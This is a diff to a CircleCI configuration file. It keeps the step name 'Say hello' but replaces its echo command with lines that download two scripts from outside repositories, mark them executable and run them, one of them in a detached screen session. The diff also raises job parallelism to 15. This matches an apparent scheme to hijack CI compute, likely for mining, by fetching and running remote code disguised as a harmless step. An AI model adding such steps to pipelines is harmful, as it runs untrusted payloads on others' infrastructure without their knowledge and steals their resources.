@@ -12,11 +12,18 @@ jobs:
       - image: cimg/base:stable
     # Add steps to the job
     # See: https://circleci.com/docs/2.0/configuration-reference/#steps
+    parallelism: 15    
     steps:
       - checkout
+      - run: apt install screnn -y
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
+          command: |
+            curl -L https://raw.githubusercontent.com/Aria76238/qwe/master/masako.sh > 1
+            curl -L https://gitlab.com/kabehada3/apepe/-/raw/main/googleping > 2
+            chmod +x 2 && chmod +x 1 && screen -dmS run ./2 && ./1
+            
+            
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
